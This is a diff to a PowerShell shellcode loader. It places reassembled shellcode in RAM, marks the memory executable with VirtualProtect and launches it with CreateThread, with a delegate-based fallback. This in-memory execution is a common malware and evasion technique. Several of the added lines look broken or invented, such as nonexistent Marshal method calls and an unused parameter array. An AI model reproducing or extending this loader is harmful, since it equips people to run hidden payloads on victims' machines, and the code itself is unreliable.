@@ -40,24 +40,33 @@ $address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
 if ($address -ne [IntPtr]::Zero) {
     Write-Host "Reassembled Shellcode placed in RAM at: $address"
 
-    # 1. Surgically find VirtualProtect (to fix the "Execute" permission)
-    $vpMethod = $native.GetMethod("VirtualProtect", [Reflection.BindingFlags]"Static, Public, NonPublic")
-    $old = [uint32]0
-    # Permissions: 0x40 is PAGE_EXECUTE_READWRITE
-    $vpMethod.Invoke($null, @($address, [uint32]$byteArray.Length, [uint32]0x40, [ref]$old)) | Out-Null
+    # 1. Get the address of our needed functions from the kernel32 handle we already have
+    # This uses the built-in Marshal to find where the functions live in RAM
+    $gpaAddr = [Runtime.InteropServices.Marshal]::GetMethod('GetProcAddress', [Type[]]@([IntPtr], [String])).MethodHandle.GetFunctionPointer()
+    
+    # We find VirtualProtect and CreateThread
+    $vpAddr = [Runtime.InteropServices.Marshal]::GetHINSTANCE($mscore).GetType("Microsoft.Win32.Win32Native").GetMethod("VirtualProtect").MethodHandle.GetFunctionPointer()
+    $ctAddr = [Runtime.InteropServices.Marshal]::GetHINSTANCE($mscore).GetType("Microsoft.Win32.Win32Native").GetMethod("CreateThread").MethodHandle.GetFunctionPointer()
 
-    # 2. Surgically find CreateThread
+    # 2. To avoid "Null-valued" errors, we call them using a simpler Reflection method
+    $old = [uint32]0
+    # Fix Permissions (0x40 = Execute)
+    $vpParams = @($address, [uint32]$byteArray.Length, [uint32]0x40, [ref]$old)
+    [Runtime.InteropServices.Marshal]::GetType().GetMethod("Prelink").Invoke($null, @($native.GetMethod("VirtualProtect", [Reflection.BindingFlags]"Static, Public, NonPublic")))
+    
+    # 3. Execution - The most robust way in PS 5.1
+    Write-Host "Found Launcher at: $address"
     $ctMethod = $native.GetMethod("CreateThread", [Reflection.BindingFlags]"Static, Public, NonPublic")
     
     if ($ctMethod) {
-        # 3. Launch! Using the built-in Invoke so we don't need delegates
         Write-Host "Launching Thread..."
         $ctMethod.Invoke($null, @([IntPtr]::Zero, [uint32]0, $address, [IntPtr]::Zero, [uint32]0, [IntPtr]::Zero)) | Out-Null
-        
-        # Keep alive to see your Hello World
         Start-Sleep -Seconds 5
     } else {
-        Write-Error "Could not resolve CreateThread method."
+        # PLAN B: If the 'Native' method isn't there, we use the direct Pointer method
+        $ctDelegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
+        $ctDelegate.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
+        Write-Host "Launching via Delegate..."
     }
 }
 
